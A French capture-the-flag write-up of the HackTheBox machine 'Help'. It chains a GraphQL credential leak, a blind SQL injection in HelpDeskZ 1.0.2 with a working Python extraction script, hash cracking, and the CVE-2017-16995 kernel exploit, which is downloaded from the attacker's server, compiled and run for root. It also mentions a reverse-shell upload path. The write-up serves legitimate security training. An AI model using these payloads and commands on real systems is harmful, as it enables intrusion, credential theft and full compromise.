---
tags:
  - HTB
  - WriteUp
  - Linux
  - Easy
  - GraphQL
  - SQLi
  - BPF
  - KernelExploit
  - HelpDeskZ
date: 2026-07-08
platform: HackTheBox
difficulty: Easy
os: Linux
status: Pwned
ip: 10.129.27.149
---

# HTB — Help

## Informations

| Champ | Valeur |
|---|---|
| Plateforme | HackTheBox |
| Difficulté | Easy |
| OS | Linux (Ubuntu 16.04.5) |
| IP cible | `10.129.27.149` |
| Kernel | `4.4.0-116-generic #140` |
| Date | 2026-07-08 |

---

## Vue d'ensemble

La machine expose trois services : SSH (22), Apache/HelpDeskZ (80) et un serveur Node.js Express (3000). Le chemin principal passe par l'énumération d'un endpoint **GraphQL** pour obtenir des credentials, puis une **SQL injection blind boolean-based** dans HelpDeskZ pour extraire le hash SHA1 du staff admin. Le hash cracké donne accès SSH. La privesc exploite une vulnérabilité du vérificateur BPF du noyau Linux (**CVE-2017-16995**).

---

## Outils utilisés

| Outil | Usage |
|---|---|
| `nmap` | Scan de ports et détection de services |
| `gobuster` | Brute-force de répertoires web |
| `curl` | Requêtes HTTP manuelles / validation d'oracle SQLi |
| `searchsploit` | Recherche d'exploits connus pour HelpDeskZ |
| Burp Suite | Interception de requêtes, identification du paramètre vulnérable |
| Python 3 (`requests`) | Script d'exploitation SQLi blind |
| `hashcat` | Crack du hash SHA1 (`-m 100`) |
| `gcc` | Compilation du kernel exploit sur la cible |
| `wget` | Transfert de fichiers vers la cible |
| `python3 -m http.server` | Serveur HTTP temporaire pour livraison du payload |

---

## 1. Énumération

### Nmap

```bash
ports=$(nmap -p- --min-rate=1000 -T4 10.129.27.149 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sV 10.129.27.149
```

**Résultats :**

| Port | Service | Version |
|---|---|---|
| 22 | SSH | OpenSSH 7.2p2 Ubuntu |
| 80 | HTTP | Apache 2.4.18 (Ubuntu) |
| 3000 | HTTP | Node.js Express |

**Ajout dans `/etc/hosts` :**

```bash
echo "10.129.27.149 help.htb" | sudo tee -a /etc/hosts
```

---

### Gobuster — Port 80

```bash
gobuster dir -w /usr/share/wordlists/dirb/directory-list-2.3-medium.txt -t 100 -u http://help.htb/
```

Découverte du répertoire `/support` → installation **HelpDeskZ 1.0.2**.

**Vérification de la version via `UPGRADING.txt` :**

```bash
curl http://help.htb/support/UPGRADING.txt
```

Retourne le changelog confirmant la version **1.0.2**.

---

### SearchSploit — HelpDeskZ

```bash
searchsploit helpdeskz
```

```
HelpDeskZ 1.0.2 - Arbitrary File Upload              | php/webapps/40300.py
HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection    | php/webapps/41200.py
```

Deux vecteurs identifiés :
- `40300.py` → File upload non authentifié (RCE)
- `41200.py` → SQLi authentifiée (extraction credentials)

---

### GraphQL — Port 3000

Naviguer sur `http://help.htb:3000` retourne :

```json
{"message":"Hi Shiv, To get access please find the credentials with given query"}
```

Le serveur tourne sur Express → recherche GraphQL.

**Énumération de l'endpoint :**

```bash
curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username, password}}' | jq
```

**Résultat :**

```json
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

Le hash fait 32 caractères → **MD5**. Crack sur hashkiller/hashcat :

```bash
hashcat -m 0 5d3c93182bb20f07b994a7f617e99cff /usr/share/wordlists/rockyou.txt
# → godhelpmeplz
```

**Credentials HelpDeskZ :** `helpme@helpme.com` / `godhelpmeplz`

---

## 2. Foothold — SQL Injection Blind (HelpDeskZ)

### Identification du vecteur

Après login sur `/support`, on soumet un ticket avec une pièce jointe. L'URL d'accès à l'attachement a la forme :

```
http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=9
```

Le 4ème paramètre (`msg_id` / `$params[3]`) est injecté sans sanitisation dans la requête SQL (source : `view_tickets_controller.php` ligne 95).

### Validation de l'oracle

```bash
COOKIE="lang=english; usrhash=<HASH_URL_ENCODE>; PHPSESSID=<SESSION>"

# Condition VRAIE → retourne le fichier (Content-Disposition présent)
curl -s -i -g -b "$COOKIE" \
  "http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=9+and+1=1--+-"

# Condition FAUSSE → 404 HTML (1102 octets, pas de Content-Disposition)
curl -s -i -g -b "$COOKIE" \
  "http://help.htb/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=9+and+1=2--+-"
```

**Oracle :** présence du header `Content-Disposition: attachment` = condition vraie.

> ⚠️ `-g` est indispensable avec curl pour désactiver le globbing des `[]` qui déformerait l'URL.

---

### Points clés de l'adaptation du script searchsploit

Le script `41200.py` original ne pouvait pas être utilisé tel quel :

| Problème | Solution |
|---|---|
| Python 2 (`print "..."`) | Réécriture Python 3 |
| Refait tout le login (CSRF, POST) | On réutilise les cookies de session existants |
| Cherche le préfixe de table dynamiquement (`hdz_`) | Sur cette box : table `staff` sans préfixe |
| Oracle sur texte `"couldn't find"` | Oracle sur header `Content-Disposition` |
| Payload `or 1=1 and ascii(substr(...))` | Payload `and substr(...)='x'` (plus fiable ici) |

---

### Script d'exploitation SQLi

```python
import requests
import string
from urllib.parse import quote

BASE = "http://help.htb/support/?v=view_tickets&action=ticket"
COOKIE = ("lang=english; "
    "usrhash=<USRHASH_URL_ENCODE>; "
    "PHPSESSID=<PHPSESSID>")
HEADERS = {"Cookie": COOKIE}
TICKET = "5"

def oracle(payload):
    url = f"{BASE}&param[]={TICKET}&param[]=attachment&param[]=1&param[]={quote(payload)}"
    r = requests.get(url, headers=HEADERS, allow_redirects=False)
    return "Content-Disposition" in r.headers

def extract(column, charset):
    out = ""
    pos = 1
    while pos <= 45:
        found = False
        for c in charset:
            payload = f"9 and substr((select {column} from staff limit 0,1),{pos},1)='{c}'-- -"
            if oracle(payload):
                out += c
                print(f"    [{pos}] {out}")
                found = True
                break
        if not found:
            break
        pos += 1
    return out

# Validation oracle
print("[TEST] 1=1 (True) :", oracle("9 and 1=1-- -"))
print("[TEST] 1=2 (False):", oracle("9 and 1=2-- -"))

hexchars = string.digits + "abcdef"       # SHA1 = [0-9a-f] uniquement
emailchars = string.ascii_lowercase + string.digits + "@_."

print("\n[*] Password (SHA1)...")
p = extract("password", hexchars)
print("\n[*] Email...")
u = extract("email", emailchars)

print("=" * 40)
print(f"email:           {u}")
print(f"password (SHA1): {p}")
```

**Résultat :**

```
email:           support@mysite.com
password (SHA1): d318f44739dced66793b1a603028133a76ae680e
```

### Crack du hash SHA1

```bash
echo "d318f44739dced66793b1a603028133a76ae680e" > hash.txt
hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt
# → Welcome1
```

**Credentials SSH :** `help` / `Welcome1`

> Le nom d'utilisateur SSH `help` est à deviner (non extrait de la DB) — c'est le nom de la machine.

---

### Accès SSH

```bash
ssh help@10.129.27.149
# password: Welcome1
```

**User flag :**

```bash
cat ~/user.txt
# 15db5b44c301bef76dde6bd49c9f2fbb
```

---

## 3. Privilege Escalation — CVE-2017-16995

### Identification de la version kernel

```bash
uname -a
# Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
```

### Recherche d'exploit

Kernel `4.4.0-116-generic` → **CVE-2017-16995** (eBPF verifier integer overflow).

- **Exploit-DB :** [EDB-44298](https://www.exploit-db.com/exploits/44298)
- **Auteur :** @bleidl / vnik

### Mécanique de la vulnérabilité

Le vérificateur BPF du noyau Linux avant `4.14.8` ne valide pas correctement certaines instructions BPF en arithmétique signée/non-signée. Un programme BPF malformé peut passer la vérification et obtenir une **lecture/écriture arbitraire en mémoire kernel**. L'exploit :

1. Charge une map BPF + programme malformé → obtient un primitif R/W kernel
2. Remonte la stack kernel → `task_struct` → `cred` → `uid`
3. Écrase `uid=0` → `/bin/bash` spawné en root

> ⚠️ `CRED_OFFSET 0x5f8` est hardcodé pour `#140-Ubuntu`. Si le build diffère, ajuster l'offset.

### Exploitation

**Côté Exegol — Lancer le serveur HTTP :**

```bash
cd /workspace
python3 -m http.server 9090
# Sert le fichier 44298.c sur http://10.10.16.248:9090/
```

**Côté cible (SSH) — Compiler et exécuter :**

```bash
cd /tmp
wget http://10.10.16.248:9090/44298.c    # télécharge le source C
gcc 44298.c -o privesc                   # compile sur la cible (même glibc)
chmod +x privesc                         # rend exécutable
./privesc                                # lance l'exploit
```

> ⚠️ Ne pas compiler sur Exegol et transférer le binaire : incompatibilité glibc (`GLIBC_2.34 not found` sur la cible Ubuntu 16.04). Toujours compiler sur la cible ou utiliser `gcc -static`.

**Résultat :**

```
task_struct = ffff88003898000
uidptr = ffff88003a860e44
spawning root shell
root@help:/tmp#
```

**Root flag :**

```bash
cat /root/root.txt
```

---

## 4. Chemin alternatif — File Upload RCE (40300.py)

HelpDeskZ 1.0.2 est aussi vulnérable à un **upload arbitraire non authentifié** (EDB-40300). Le fichier est uploadé avant la vérification d'extension, et son nom est un MD5 du timestamp :

```
$filename = md5($FILES['attachment']['name'].time()).".".$ext
```

L'upload se fait dans `/support/uploads/tickets/`. Le script `40300.py` brute-force le hash MD5 en parallèle pour retrouver le nom du fichier et déclencher le shell.

```bash
python 40300.py http://help.htb/support/uploads/tickets/ php-reverse-shell.php
```

Ce vecteur ne nécessite pas de credentials mais demande une synchronisation de temps précise (timezone).

---

## 5. Résumé de la chaîne d'exploitation

```
GraphQL (port 3000)
    └─► Credentials HelpDeskZ (helpme@helpme.com / godhelpmeplz)
            └─► Login HelpDeskZ
                    └─► SQLi Blind Boolean (param[]=msg_id, table staff)
                            └─► Hash SHA1 cracké → Welcome1
                                    └─► SSH help@help.htb
                                            └─► CVE-2017-16995 (BPF kernel exploit)
                                                    └─► root
```

---

## 6. CVEs et références

| CVE | Description | CVSS |
|---|---|---|
| CVE-2017-16995 | Linux kernel eBPF verifier integer overflow → LPE | 7.8 High |
| EDB-40300 | HelpDeskZ 1.0.2 Arbitrary File Upload (unauth) | — |
| EDB-41200 | HelpDeskZ < 1.0.2 Authenticated SQL Injection | — |

- [CVE-2017-16995 NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-16995)
- [EDB-44298 kernel exploit](https://www.exploit-db.com/exploits/44298)
- [EDB-41200 HelpDeskZ SQLi](https://www.exploit-db.com/exploits/41200)
- [EDB-40300 HelpDeskZ Upload](https://www.exploit-db.com/exploits/40300)

---

## 7. Leçons retenues

- **Les exploits searchsploit sont des points de départ**, pas des boîtes noires. Lire le code, comprendre la technique, adapter au contexte (session, table, oracle, Python version).
- **L'oracle d'une SQLi blind doit être validé manuellement** avant de scripter (curl + `-g` pour les `[]`, comparer headers et taille de réponse).
- **La compatibilité glibc** : toujours compiler un exploit C sur la machine cible ou utiliser `-static`. Un binaire compilé sur Kali/Exegol ne tournera pas forcément sur Ubuntu 16.04.
- **GraphQL sans auth** peut exposer des données sensibles directement si les resolvers ne sont pas protégés.
